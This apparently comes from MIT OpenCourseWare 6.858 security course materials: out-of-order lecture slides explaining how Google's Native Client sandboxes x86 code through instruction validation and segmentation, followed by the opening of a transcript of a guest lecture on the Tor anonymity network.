Call-into-service -runtime	&#13; performance seems comparable to Linux syscalls.
How hard	&#13; is it to	&#13; port code to	&#13; NaCl?
For computational things, seems straightforward: 20 LoC change	&#13; for H.264.
For code that interacts with system (syscalls, etc), need to change them.
oE.g., Bullet physics simulator (section 4.4).
Additional references.
Native	&#13; Client
for 64 -bit	&#13; x86 and for ARM.
ohttp://static.usenix.org/events/sec10/tech/full_papers/Sehr.pdf
Native Client	&#13; for runtime-generated	&#13; code (JIT).
ohttp://research.google.com/pubs/archive/37204.pdf
Native	&#13; Client without hardware	&#13; dependence.
ohttp://css.csail.mit.edu/6.858/2012/readings/pnacl.pdf
Other software fault isolation systems w/ fine-grained memory access control.
ohttp://css.csail.mit.edu/6.858/2012/readings/xfi.pdf
ohttp://research.microsoft.com/pubs/101332/bgii -sosp.pdf
Formally verifying the validator.
ohttp://www.cse.lehigh.edu/~gtan/paper/rocksalt.pdf
7</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>One practical	&#13; possibility: run	&#13; in	&#13; 32 -bit	&#13; mode.
o AMD/Intel CPUs	&#13; still support segment limits in 32-bit mode.
o Can run in 32 -bit	&#13; mode even on a 64- bit	&#13; OS.
 Would have to change the computed-jump	&#13; code to limit target to 256MB.
 Would have to add runtime instrumentation to each memory read/write.
 See the paper in additional references below for more details.
Why doesn't Native Client	&#13; support exceptions
for modules?
 What if module triggers hardware exception:	&#13; null ptr,	&#13; divide -by-zero, etc.
 OS
kernel	&#13; needs to deliver exception	&#13; (as a signal) to process.
 But Native Client	&#13; runs with an unusual stack pointer/segment selector.
 Some OS kernels refuse to deliver signals in this situation.
 NaCl's	&#13; solution	&#13; is to	&#13; prohib it hardware	&#13; except ions	&#13; altogether.
 Language -level	&#13; exceptions (e.g., C++)	&#13; do not involve hardware: no problem
What would happen if the NaCl	&#13; module had a buffer overflow?
 Any computed call (function pointer, return address) has to use 2-instr jump.
 As a result, can only jump to validated code in the module's region.
 Buffer overflows might allow attacker to take over module.
 However, can't escape	&#13; NaCl's	&#13; sandbox.
Limitations of the original NaCl	&#13; design?
 Static code: no JIT,	&#13; no shared	&#13; libraries.
 Dynamic code supported	&#13; in recent versions (see additional refs at the	&#13; end).
Invoking trusted code from sandbox. Short code sequences that transition to/from sandbox located in [4KB..64KB).
 Trampoline undoes the sandbox, enters trusted code.
o Starts	&#13; at a 32-byte	&#13; multiple boundary.
o Loads unlimited segment into %cs, %ds segment selectors.
o Jumps to trusted code that lives above 256MB.
o Slightly tricky: must ensure trampoline fits in 32 bytes.
o (Otherwise, module could jump into middle
 of trampoline code..)
o Trusted	&#13; code first switches	&#13; to	&#13; a different stack:	&#13; why?
o Subsequently, trusted	&#13; code has to r e-load	&#13; other segment selectors.
 Springboard	&#13; (re-)enters	&#13; the	&#13; sandbox on return	&#13; or initial start.
o Re-set	&#13; segment selectors, jump to a particular address in NaCl	&#13; module.
o Springboard	&#13; slots (32 -byte	&#13; multiples) start with HLT.	&#13; 
o Prevents
computed jumps into springboard by module code.
What's provided by the service runtime? NaCl's	&#13; "system call" equivalent.
 Memory allocation: sbrk/mmap.
 Thread	&#13; operations:	&#13; create,	&#13; etc.
 IPC:	&#13; initially with Javascript code on page that started this NaCl	&#13; program.
6</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>## copy- paste and add --no- dir-check as the error message asks
## visit http://localhost:5103/
## change hello.cc to "memset(buf, 'A', 1024);"
% make
 % !python
## visit http://localhost:5103/
## ctrl-shift
-J, view console
What are some options for safely running x86 code?
Approach 0: trust the code developer.
ActiveX, browser plug-ins,	&#13; Java,	&#13; etc.
Developer	&#13; signs	&#13; code with	&#13; private	&#13; key.
Asks user to decide whether to trust code from some developer.
Users are bad at making such decisions (e.g., with ActiveX code).
oWorks for kn own	&#13; developers	&#13; (e.g., Windows	&#13; Upda te	&#13; code, signed by	&#13; MS).
oUnclear	&#13; how to	&#13; answer	&#13; for unknown	&#13; web applications	&#13; (other	&#13; than	&#13; "no").
Native	&#13; Client's	&#13; 
goal is to	&#13; enforce safety,	&#13; avoid	&#13; asking	&#13; the	&#13; user.
Approach 1: hardware protection / OS sandboxing.	&#13; 
Similar plan to some ideas we've already read: OKWS, Capsicum,	&#13; VMs,	&#13; ..
Run untrusted	&#13; code as a regular user-space	&#13; program or a separate VM.
Need to control what system calls the untrusted code can invoke.
oLinux: seccomp.
oFreeBSD: Capsicum.
oMacOSX: Seatbelt.
oWindows: u nclear what options exist.
Native	&#13; 
client uses	&#13; these	&#13; techniques,	&#13; but only	&#13; as	&#13; a backup plan.
Why not	&#13; rely on	&#13; OS sandboxing	&#13; directly?
oEach OS may impose different, sometimes incompatible requirements.
System calls to allocate memory, create
threads, etc.
Virtual	&#13; memory layout (fixed-address shared libraries in	&#13; 
Windows?).
oOS kernel vulnerabilities are reasonably common.
Allows untrusted code to escape sandbox.

oNot every OS might have a sufficient sandboxing mechanism.
E.g., unclear what to do	&#13; on
Windows,	&#13; wi thout	&#13; a speci al	&#13; kernel	&#13; 
module.
Some sandboxing mechanisms require root: don't want to run
Chrome	&#13; as root.
oHardware	&#13; might have vulnerabilities (!).
Authors
claim some instructions happen to
hang the hardware.
Would be unfortunate if visiting	&#13; a web	&#13; site coul d	&#13; hang	&#13; your	&#13; 
computer.
2</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858 Lecture 7
Native Client
What's the goal	&#13; of this paper?
At the time, browsers allowed any web page to run only JS (+Flash) code.
Want to allow web apps to run native (e.g., x86) code on user's machine.
oDon't want to run complex code on server.
oRequires	&#13; lots of server resources,	&#13; incurs	&#13; high latency for users.
Why is th
is useful?
oPerformance.
oLanguages	&#13; other	&#13; than JS.
oLegacy	&#13; apps.
Actually being used in the
real world.
oShips as part of Google Chrome:	&#13; the NaCl	&#13; runtime is a browser extension.
oWeb	&#13; page	&#13; can run a NaCl	&#13; program much like a Flash program.
oJavascript can interact with the NaCl	&#13; program by passing messages.
oNaCl	&#13; also provides strong sandboxing for some other use cases.
Core	&#13; problem: sandboxing x86 code.
Using
native	&#13; client:
https://developers.google.com/native-client/
Install	&#13; browser plug in
Use Nacl tool change to compile C or C++	&#13; program
oThere are restrictions on what system calls you can use
oExample app: games (don't need much systems support)
oSpecial interface	&#13; to talk to browser (in release	&#13; call ed	&#13; Pepper)
Make a web page that includes Nacl module:
 &lt;embed name="nacl_module"
 
id="hello_world"
 
width=0 height=0
src="hello_world.nmf"
 type="application/x-nacl" /&gt;
 
Mo
dule is "controled"	&#13; x86 cod e.
Quick demo:
% urxvt - fn xft:Monospace- 20
% export NACL_SDK_ROOT=/home/nickolai/tmp/nacl_sdk/pepper_35
% cd ~/6.858/git/fall14/web/lec/nacl- demo
## this is from NaCl's tutorial part1
% vi hello.cc
 % vi index.html
 % make
 % make serve
 
1</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>Approach 2: software fault isolation (Native Client's	&#13; primary sandboxing	&#13; plan).
Given an	&#13; x86	&#13; binary	&#13; to	&#13; run in Native	&#13; Client,	&#13; verify that it's	&#13; safe.
oVerification involves	&#13; checking each	&#13; instruction in the	&#13; binary.
oSome instructions might	&#13; be always safe: allow.
oSome instructions might be sometimes safe.
Software	&#13; fault isolation's approach	&#13; is to 
require	&#13; a check before	&#13; 
these.
Must ensure the
check is present at verification time.
Another option: insert the check through binary rewriting.
Hard	&#13; to do with x86, but might be more doable with higher -
level	&#13; lang.
oSome instructions might
be not worth making safe: prohibit.
After verifying, can safely run it
in same process as other trusted code.
Allow the sandbox to call into trusted "service runtime" code. (Figure 2 from
paper)
What does safety mean for a Native
Client	&#13; module?
Goal #1: does not execute	&#13; any	&#13; disallowed	&#13; instructions	&#13; (e.g., syscall,	&#13; int).
oEnsures module does not perform any system calls.
Goal #2: does not access memory or execute code outside of module boundary.
oEnsures module does not corrupt service runtime data structures.
oEnsures module does not jump into service runtime code, ala return-to -
libc.
oAs described in paper, module code+data live within [0..256MB) virt
addrs.
Need n
ot populate	&#13; entire	&#13; 256MB of virtual address	&#13; space.
oEverything else should be protected from access by the NaCl	&#13; module.
How	&#13; to check if the module can execute a disallowed instruction?
Strawman: scan the executable, look for "int" or "syscall" opcodes.
oIfcheck passes, can start running code.
oOf
course, need to also mark all code as read-only.
oAnd all writable memory as non-executable.
Complication:	&#13; x86 has variable-length
instructions.
o"int" and "syscall" instructions	&#13; are	&#13; 2 bytes long.
oOther instructions c ould	&#13; be anywhere from 1 to 15 bytes.
Suppose program's  code  contains the following  bytes :
25 CD 80 00 00 
 
If interpreted as an instruction
starting from 25, it is a 5-byte instr:
AND %eax, $0x000080cd
 
3</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>C1:	&#13; executable code in memory is not writable.
C2: binary	&#13; is statically	&#13; linked	&#13; at zero, code starts	&#13; at 64K.
C3:all computed jumps use the two-instruction	&#13; sequence above.
C4:	&#13; binary is padded to a
page boundary with one or more HLT	&#13; instruction.
C5: no	&#13; instructions, or our	&#13; special two-instruction	&#13; pair,	&#13; can	&#13; span	&#13; 32 bytes.
C6/C7:	&#13; all jump targets reachable by fall-thr ough	&#13; disassembly from start.
Homework	&#13; Q:  what  happens if  verifier  gets some  instruction  length wrong? 
How	&#13; to 
prevent NaCl	&#13; module from  jumping  to 32-byte multiple  outside  its code?
Could	&#13; use additional checks in the
computed-jump sequence.
E.g.:
AND $0x0fffffe0, %eax
JMP *%eax
 
Why don't	&#13; they use this approach?
Longer instruction sequence for computed jumps.
Their sequence is 3+2=5 bytes,	&#13; above	&#13; sequence is 5+2=7 bytes.
An alternative solution is pretty easy: segmentation
Segmentation.x86hardware provides "segments".
Each memory access is with
respect to some "segment".
oSegment specifies base + size.
Segments are specified
by a segment selector: ptr into a segment table.
%cs, %ds, %ss, %es, %fs, %gs
oEach instruction	&#13; can specify	&#13; what segment to use for accessing memory.
oCode	&#13; always fetched using the %cs segment.
Translation: (segment selector, addr) -&gt;	&#13; 
(segbase	&#13; + addr	&#13; % segsize).
Typically, all segments have base=0, size=max, so segmentation is a no-op.
Can	&#13; change segments: in Linux, modify_ldt() system call.
Can	&#13; change segment selectors: just "MOV %ds", etc.
Limiting code/data to module's size.
Add a new
segment with offset=0, size=256MB.
Set all segment selectors to that segment.
Modify verifier to reject	&#13; any instructions that	&#13; change segment selectors.
Ensures all code	&#13; and
data	&#13; accesses will be within [0..256MB).
(NaCl	&#13; actually  seems  to limit  the code  segment to the text  section  size. )
What would be required to run Native Client	&#13; on a system without segmentation?
For example, AMD/Intel decided to drop
segment limits in their 64-bit	&#13; CPUs.
5</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-19-anonymous-communication/</video_url>
          <video_title>Lecture 19: Anonymous Communication</video_title>
          <transcript>
            <slice>
              <time_slice>0:00</time_slice>
              <text_slice>The following content is
provided under a Creative</text_slice>
            </slice>
            <slice>
              <time_slice>0:02</time_slice>
              <text_slice>Commons license.</text_slice>
            </slice>
            <slice>
              <time_slice>0:03</time_slice>
              <text_slice>Your support will help
MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:06</time_slice>
              <text_slice>continue to offer high quality
educational resources for free.</text_slice>
            </slice>
            <slice>
              <time_slice>0:10</time_slice>
              <text_slice>To make a donation or to
view additional materials</text_slice>
            </slice>
            <slice>
              <time_slice>0:12</time_slice>
              <text_slice>from hundreds of MIT courses,
visit MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:16</time_slice>
              <text_slice>at ocw.mit.edu.</text_slice>
            </slice>
            <slice>
              <time_slice>0:27</time_slice>
              <text_slice>PROFESSOR: All right, guys.</text_slice>
            </slice>
            <slice>
              <time_slice>0:28</time_slice>
              <text_slice>Let's get started.</text_slice>
            </slice>
            <slice>
              <time_slice>0:29</time_slice>
              <text_slice>So today, we're going
to talk about Tor.</text_slice>
            </slice>
            <slice>
              <time_slice>0:31</time_slice>
              <text_slice>And we actually have
one of the authors</text_slice>
            </slice>
            <slice>
              <time_slice>0:32</time_slice>
              <text_slice>of the paper you guys read
for today, Nick Mathewson.</text_slice>
            </slice>
            <slice>
              <time_slice>0:35</time_slice>
              <text_slice>He's also one of the
main developers of Tor.</text_slice>
            </slice>
            <slice>
              <time_slice>0:37</time_slice>
              <text_slice>He's going to tell
you more about it.</text_slice>
            </slice>
            <slice>
              <time_slice>0:38</time_slice>
              <text_slice>NICK MATHEWSON: Thank you.</text_slice>
            </slice>
            <slice>
              <time_slice>0:39</time_slice>
              <text_slice>So at this point,
I could start out</text_slice>
            </slice>
            <slice>
              <time_slice>0:42</time_slice>
              <text_slice>by saying, please
put your hands up</text_slice>
            </slice>
            <slice>
              <time_slice>0:44</time_slice>
              <text_slice>if you didn't read the paper,
but that wouldn't work.</text_slice>
            </slice>
            <slice>
              <time_slice>0:48</time_slice>
              <text_slice>Because it's embarrassing
not to have read a paper</text_slice>
            </slice>
            <slice>
              <time_slice>0:50</time_slice>
              <text_slice>you're supposed to have read.</text_slice>
            </slice>
            <slice>
              <time_slice>0:52</time_slice>
              <text_slice>So instead, what I will ask
is, think of your birthday.</text_slice>
            </slice>
            <slice>
              <time_slice>0:56</time_slice>
              <text_slice>Think of the date of your birth.</text_slice>
            </slice>
            <slice>
              <time_slice>0:57</time_slice>
              <text_slice>If the last digit of the
date of your birth is odd,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01</time_slice>
              <text_slice>or you didn't read the paper,
please raise your hand.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06</time_slice>
              <text_slice>OK, that's not far from half.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09</time_slice>
              <text_slice>So I'm guessing most
people read the paper.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14</time_slice>
              <text_slice>Means of communicating that
preserve our privacy enable</text_slice>
            </slice>
            <slice>
              <time_slice>1:19</time_slice>
              <text_slice>us to communicate more
honestly to gather better</text_slice>
            </slice>
            <slice>
              <time_slice>1:23</time_slice>
              <text_slice>information about the
world when we are less</text_slice>
            </slice>
            <slice>
              <time_slice>1:26</time_slice>
              <text_slice>disinhibited from speaking
because of possibly justified</text_slice>
            </slice>
            <slice>
              <time_slice>1:32</time_slice>
              <text_slice>possibly unjustified social
and other consequences.</text_slice>
            </slice>
            <slice>
              <time_slice>1:37</time_slice>
              <text_slice>So this brings us to
Tor, which is a anonymity</text_slice>
            </slice>
            <slice>
              <time_slice>1:41</time_slice>
              <text_slice>network that I've been working
on for the last 10 years</text_slice>
            </slice>
            <slice>
              <time_slice>1:44</time_slice>
              <text_slice>with some friends and
colleagues and so on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:48</time_slice>
              <text_slice>[INAUDIBLE] there's a set of
volunteer operating servers,</text_slice>
            </slice>
            <slice>
              <time_slice>1:51</time_slice>
              <text_slice>about 6,000 of them.</text_slice>
            </slice>
            <slice>
              <time_slice>1:52</time_slice>
              <text_slice>At first, it was
just friends of ours</text_slice>
            </slice>
            <slice>
              <time_slice>1:55</time_slice>
              <text_slice>that Roger Dingledine
and I knew from MIT.</text_slice>
            </slice>
            <slice>
              <time_slice>1:58</time_slice>
              <text_slice>After that, we built
up more publicity.</text_slice>
            </slice>
            <slice>
              <time_slice>2:01</time_slice>
              <text_slice>More people started
running servers.</text_slice>
            </slice>
            <slice>
              <time_slice>2:04</time_slice>
              <text_slice>Now it's run by nonprofits,
private individuals,</text_slice>
            </slice>
            <slice>
              <time_slice>2:08</time_slice>
              <text_slice>some university teams, possibly
some of you here today,</text_slice>
            </slice>
            <slice>
              <time_slice>2:12</time_slice>
              <text_slice>and no doubt some
very sketchy people.</text_slice>
            </slice>
            <slice>
              <time_slice>2:17</time_slice>
              <text_slice>We've got about 6,000 nodes.</text_slice>
            </slice>
            <slice>
              <time_slice>2:19</time_slice>
              <text_slice>We're serving on the order
of hundreds of thousands</text_slice>
            </slice>
            <slice>
              <time_slice>2:21</time_slice>
              <text_slice>to millions of users
depending on how you count.</text_slice>
            </slice>
            <slice>
              <time_slice>2:24</time_slice>
              <text_slice>It's kind of hard to count,
because they're anonymous.</text_slice>
            </slice>
            <slice>
              <time_slice>2:26</time_slice>
              <text_slice>So you have to use statistical
techniques to estimate.</text_slice>
            </slice>
            <slice>
              <time_slice>2:29</time_slice>
              <text_slice>And we're doing on
the order of terabytes</text_slice>
            </slice>
            <slice>
              <time_slice>2:30</time_slice>
              <text_slice>per second worth of traffic.</text_slice>
            </slice>
            <slice>
              <time_slice>2:34</time_slice>
              <text_slice>Lots of people need anonymity
for their regular work.</text_slice>
            </slice>
            <slice>
              <time_slice>2:39</time_slice>
              <text_slice>Not everyone who
needs anonymity,</text_slice>
            </slice>
            <slice>
              <time_slice>2:40</time_slice>
              <text_slice>though, thinks of
it as anonymity.</text_slice>
            </slice>
            <slice>
              <time_slice>2:43</time_slice>
              <text_slice>Some people say, I
don't need anonymity.</text_slice>
            </slice>
            <slice>
              <time_slice>2:46</time_slice>
              <text_slice>I'm perfectly fine
identifying myself.</text_slice>
            </slice>
            <slice>
              <time_slice>2:48</time_slice>
              <text_slice>But there's broad
perceptions that the privacy</text_slice>
            </slice>
            <slice>
              <time_slice>2:52</time_slice>
              <text_slice>is necessary or useful.</text_slice>
            </slice>
            <slice>
              <time_slice>2:55</time_slice>
              <text_slice>And when regular citizens
use anonymity stuff,</text_slice>
            </slice>
            <slice>
              <time_slice>2:57</time_slice>
              <text_slice>they tend to be doing it
because they want privacy</text_slice>
            </slice>
            <slice>
              <time_slice>3:00</time_slice>
              <text_slice>in search results, privacy in
doing research on the internet.</text_slice>
            </slice>
            <slice>
              <time_slice>3:04</time_slice>
              <text_slice>They want to be able to
engage in local politics</text_slice>
            </slice>
            <slice>
              <time_slice>3:07</time_slice>
              <text_slice>while not offending local
politicians, and so on.</text_slice>
            </slice>
            <slice>
              <time_slice>3:12</time_slice>
              <text_slice>Researchers frequently
use anonymizing tools</text_slice>
            </slice>
            <slice>
              <time_slice>3:15</time_slice>
              <text_slice>to avoid gathering biased data,
biased by geolocation based</text_slice>
            </slice>
            <slice>
              <time_slice>3:21</time_slice>
              <text_slice>services that might
be serving them</text_slice>
            </slice>
            <slice>
              <time_slice>3:23</time_slice>
              <text_slice>in particular different
versions of things.</text_slice>
            </slice>
            <slice>
              <time_slice>3:26</time_slice>
              <text_slice>Companies use
anonymity technologies</text_slice>
            </slice>
            <slice>
              <time_slice>3:29</time_slice>
              <text_slice>for protection of
sensitive data.</text_slice>
            </slice>
            <slice>
              <time_slice>3:32</time_slice>
              <text_slice>For instance, if I can
track all of the movements</text_slice>
            </slice>
            <slice>
              <time_slice>3:38</time_slice>
              <text_slice>of the legal team for some
major internet company,</text_slice>
            </slice>
            <slice>
              <time_slice>3:42</time_slice>
              <text_slice>I can probably, just by tracking
when they're visiting their web</text_slice>
            </slice>
            <slice>
              <time_slice>3:49</time_slice>
              <text_slice>server from different
places around the world,</text_slice>
            </slice>
            <slice>
              <time_slice>3:52</time_slice>
              <text_slice>or where they're visiting
the company [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>3:54</time_slice>
              <text_slice>different places
around the world,</text_slice>
            </slice>
            <slice>
              <time_slice>3:56</time_slice>
              <text_slice>learn a lot about which teams
are collaborating with which.</text_slice>
            </slice>
            <slice>
              <time_slice>3:58</time_slice>
              <text_slice>And this is
information companies</text_slice>
            </slice>
            <slice>
              <time_slice>4:00</time_slice>
              <text_slice>would like to keep private.</text_slice>
            </slice>
            <slice>
              <time_slice>4:02</time_slice>
              <text_slice>Companies use also the anonymity
technology for doing research.</text_slice>
            </slice>
            <slice>
              <time_slice>4:07</time_slice>
              <text_slice>So a major router
manufacturer for a while--</text_slice>
            </slice>
            <slice>
              <time_slice>4:12</time_slice>
              <text_slice>I don't know if this
is still the case--</text_slice>
            </slice>
            <slice>
              <time_slice>4:13</time_slice>
              <text_slice>would regularly serve different
versions of its product sheets</text_slice>
            </slice>
            <slice>
              <time_slice>4:17</time_slice>
              <text_slice>to IP addresses associated
with its competitors</text_slice>
            </slice>
            <slice>
              <time_slice>4:20</time_slice>
              <text_slice>in order to make reverse
engineering trickier.</text_slice>
            </slice>
            <slice>
              <time_slice>4:23</time_slice>
              <text_slice>And they found this out by
using our software and said,</text_slice>
            </slice>
            <slice>
              <time_slice>4:26</time_slice>
              <text_slice>hey, wait a minute, we got
a different product sheet</text_slice>
            </slice>
            <slice>
              <time_slice>4:28</time_slice>
              <text_slice>when we came in from Tor
than we did coming directly.</text_slice>
            </slice>
            <slice>
              <time_slice>4:32</time_slice>
              <text_slice>And it's also kind of
normal for some companies</text_slice>
            </slice>
            <slice>
              <time_slice>4:34</time_slice>
              <text_slice>to serve other companies
versions of their websites</text_slice>
            </slice>
            <slice>
              <time_slice>4:36</time_slice>
              <text_slice>to emphasize the employment
opportunity sections.</text_slice>
            </slice>
            <slice>
              <time_slice>4:41</time_slice>
              <text_slice>Regular law enforcement needs
anonymity technologies as well</text_slice>
            </slice>
            <slice>
              <time_slice>4:46</time_slice>
              <text_slice>to avoid tipping off people
during investigations.</text_slice>
            </slice>
            <slice>
              <time_slice>4:49</time_slice>
              <text_slice>You do not want the
local police station</text_slice>
            </slice>
            <slice>
              <time_slice>4:51</time_slice>
              <text_slice>to appear in the web logs of
somebody you're investigating.</text_slice>
            </slice>
            <slice>
              <time_slice>4:57</time_slice>
              <text_slice>And regular folks
need it, as I said,</text_slice>
            </slice>
            <slice>
              <time_slice>5:00</time_slice>
              <text_slice>for avoiding harassment
because of online activities,</text_slice>
            </slice>
            <slice>
              <time_slice>5:04</time_slice>
              <text_slice>to research stuff that
might be embarrassing.</text_slice>
            </slice>
            <slice>
              <time_slice>5:07</time_slice>
              <text_slice>If you live in a country with
uncertain health care laws,</text_slice>
            </slice>
            <slice>
              <time_slice>5:13</time_slice>
              <text_slice>you might want to avoid
creating too much public record</text_slice>
            </slice>
            <slice>
              <time_slice>5:16</time_slice>
              <text_slice>of what diseases you think
you might have and so on,</text_slice>
            </slice>
            <slice>
              <time_slice>5:19</time_slice>
              <text_slice>or what dangerous
hobbies you might have.</text_slice>
            </slice>
            <slice>
              <time_slice>5:21</time_slice>
              <text_slice>And also lots of criminal or bad
folks use anonymity technology.</text_slice>
            </slice>
            <slice>
              <time_slice>5:27</time_slice>
              <text_slice>It's not their only option.</text_slice>
            </slice>
            <slice>
              <time_slice>5:28</time_slice>
              <text_slice>But if you are willing to
purchase time on a bot net,</text_slice>
            </slice>
            <slice>
              <time_slice>5:33</time_slice>
              <text_slice>you can buy some
pretty good privacy</text_slice>
            </slice>
            <slice>
              <time_slice>5:35</time_slice>
              <text_slice>that is not available
to people who</text_slice>
            </slice>
            <slice>
              <time_slice>5:38</time_slice>
              <text_slice>think that bot nets are amoral.</text_slice>
            </slice>
            <slice>
              <time_slice>5:39</time_slice>
              <text_slice>And Tor, and anonymity
stuff in general,</text_slice>
            </slice>
            <slice>
              <time_slice>5:43</time_slice>
              <text_slice>are not the only multi-use
technology out there.</text_slice>
            </slice>
            <slice>
              <time_slice>5:49</time_slice>
              <text_slice>Let's see, the average age
of a graduate is about 20.</text_slice>
            </slice>
            <slice>
              <time_slice>5:51</time_slice>
              <text_slice>So around when you were
born-- have you talked</text_slice>
            </slice>
            <slice>
              <time_slice>5:56</time_slice>
              <text_slice>about crypto wars at all?</text_slice>
            </slice>
            <slice>
              <time_slice>5:58</time_slice>
              <text_slice>PROFESSOR: No.</text_slice>
            </slice>
            <slice>
              <time_slice>5:59</time_slice>
              <text_slice>NICK MATHEWSON: No.</text_slice>
            </slice>
            <slice>
              <time_slice>6:00</time_slice>
              <text_slice>During the 1990s, it was sort
of an up-in-the-air question</text_slice>
            </slice>
            <slice>
              <time_slice>6:02</time_slice>
              <text_slice>in the United States about
to what extent civilian use</text_slice>
            </slice>
            <slice>
              <time_slice>6:06</time_slice>
              <text_slice>of non-backdoor cryptography
should be legal,</text_slice>
            </slice>
            <slice>
              <time_slice>6:09</time_slice>
              <text_slice>and to what extent it
should be exported.</text_slice>
            </slice>
            <slice>
              <time_slice>6:11</time_slice>
              <text_slice>That kind of came
down pretty decisively</text_slice>
            </slice>
            <slice>
              <time_slice>6:13</time_slice>
              <text_slice>on the side of cryptography
should be legal and exportable</text_slice>
            </slice>
            <slice>
              <time_slice>6:17</time_slice>
              <text_slice>during the '90s and early 2000s.</text_slice>
            </slice>
            <slice>
              <time_slice>6:20</time_slice>
              <text_slice>And although there's some debate
about anonymity technology,</text_slice>
            </slice>
            <slice>
              <time_slice>6:24</time_slice>
              <text_slice>it's more or less
the same debate.</text_slice>
            </slice>
            <slice>
              <time_slice>6:27</time_slice>
              <text_slice>And I think it's going to end
in more or less the same way.</text_slice>
            </slice>
            <slice>
              <time_slice>6:30</time_slice>
              <text_slice>So here's an outline of my talk.</text_slice>
            </slice>
            <slice>
              <time_slice>6:33</time_slice>
              <text_slice>I'm going to give you that
little introduction I gave you,</text_slice>
            </slice>
            <slice>
              <time_slice>6:35</time_slice>
              <text_slice>talk a little bit about
what we mean by anonymity</text_slice>
            </slice>
            <slice>
              <time_slice>6:37</time_slice>
              <text_slice>in a technical sense, talk a
little about our motivations</text_slice>
            </slice>
            <slice>
              <time_slice>6:40</time_slice>
              <text_slice>for getting into it.</text_slice>
            </slice>
            <slice>
              <time_slice>6:41</time_slice>
              <text_slice>Then I'm going to kind
of walk you through step</text_slice>
            </slice>
            <slice>
              <time_slice>6:44</time_slice>
              <text_slice>by step how you start
with the idea of,</text_slice>
            </slice>
            <slice>
              <time_slice>6:47</time_slice>
              <text_slice>we ought to have some
anonymity, and how</text_slice>
            </slice>
            <slice>
              <time_slice>6:50</time_slice>
              <text_slice>do you wind up with the
design of Tor from that point.</text_slice>
            </slice>
            <slice>
              <time_slice>6:52</time_slice>
              <text_slice>And I'll mention
some branching off</text_slice>
            </slice>
            <slice>
              <time_slice>6:54</time_slice>
              <text_slice>points where you might
wind up with other designs.</text_slice>
            </slice>
            <slice>
              <time_slice>6:56</time_slice>
              <text_slice>I'll pause to answer some
of the cool questions</text_slice>
            </slice>
            <slice>
              <time_slice>6:59</time_slice>
              <text_slice>that everyone has sent in
for their class assignment.</text_slice>
            </slice>
            <slice>
              <time_slice>7:04</time_slice>
              <text_slice>I'll talk a little bit about
how node discovery works,</text_slice>
            </slice>
            <slice>
              <time_slice>7:06</time_slice>
              <text_slice>which is an important topic.</text_slice>
            </slice>
            <slice>
              <time_slice>7:08</time_slice>
              <text_slice>And then I'll sort
of by show of hands</text_slice>
            </slice>
            <slice>
              <time_slice>7:10</time_slice>
              <text_slice>pick which of these
advanced topics to cover.</text_slice>
            </slice>
            <slice>
              <time_slice>7:12</time_slice>
              <text_slice>I guess we're calling them
advanced because they're later</text_slice>
            </slice>
            <slice>
              <time_slice>7:15</time_slice>
              <text_slice>in the lecture.</text_slice>
            </slice>
            <slice>
              <time_slice>7:16</time_slice>
              <text_slice>And I can't read them all,
but they're all really cool.</text_slice>
            </slice>
            <slice>
              <time_slice>7:19</time_slice>
              <text_slice>I'll mention some
related systems</text_slice>
            </slice>
            <slice>
              <time_slice>7:21</time_slice>
              <text_slice>whose designs you
ought to check out</text_slice>
            </slice>
            <slice>
              <time_slice>7:23</time_slice>
              <text_slice>if this is a topic that
interests you and you'd like</text_slice>
            </slice>
            <slice>
              <time_slice>7:26</time_slice>
              <text_slice>to know more about it.</text_slice>
            </slice>
            <slice>
              <time_slice>7:27</time_slice>
              <text_slice>I'll talk about future work
that we want to have done at Tor</text_slice>
            </slice>
            <slice>
              <time_slice>7:30</time_slice>
              <text_slice>and I hope that we'll
have time to do some day.</text_slice>
            </slice>
            <slice>
              <time_slice>7:32</time_slice>
              <text_slice>And if there's time for
questions, then I'll take them.</text_slice>
            </slice>
            <slice>
              <time_slice>7:35</time_slice>
              <text_slice>And I've got nowhere I need
to be for the next hour or so.</text_slice>
            </slice>
            <slice>
              <time_slice>7:38</time_slice>
              <text_slice>So I and my colleague David over
there-- can you wave your hand,</text_slice>
            </slice>
            <slice>
              <time_slice>7:43</time_slice>
              <text_slice>David-- will be hanging
around somewhere and talking</text_slice>
            </slice>
            <slice>
              <time_slice>7:47</time_slice>
              <text_slice>to anyone who wants to talk.</text_slice>
            </slice>
            <slice>
              <time_slice>7:48</time_slice>
              <text_slice>So right, anonymity--
what do we mean</text_slice>
            </slice>
            <slice>
              <time_slice>7:52</time_slice>
              <text_slice>when we talk about anonymity?</text_slice>
            </slice>
            <slice>
              <time_slice>7:54</time_slice>
              <text_slice>There are lots of
informal notions</text_slice>
            </slice>
            <slice>
              <time_slice>7:57</time_slice>
              <text_slice>that get used in informal
discussions, in online, and so</text_slice>
            </slice>
            <slice>
              <time_slice>8:03</time_slice>
              <text_slice>on.</text_slice>
            </slice>
            <slice>
              <time_slice>8:03</time_slice>
              <text_slice>Some people use
anonymous to mean,</text_slice>
            </slice>
            <slice>
              <time_slice>8:05</time_slice>
              <text_slice>I didn't write my name on it.</text_slice>
            </slice>
            <slice>
              <time_slice>8:06</time_slice>
              <text_slice>Some people use
anonymous to mean, well,</text_slice>
            </slice>
            <slice>
              <time_slice>8:10</time_slice>
              <text_slice>no one can actually
prove it's me</text_slice>
            </slice>
            <slice>
              <time_slice>8:12</time_slice>
              <text_slice>even if you suspect strongly.</text_slice>
            </slice>
            <slice>
              <time_slice>8:15</time_slice>
              <text_slice>What we mean is a number
of notions expressed</text_slice>
            </slice>
            <slice>
              <time_slice>8:18</time_slice>
              <text_slice>in terms of the
ability of an observer</text_slice>
            </slice>
            <slice>
              <time_slice>8:25</time_slice>
              <text_slice>or attacker on a network to
link participants to actions.</text_slice>
            </slice>
            <slice>
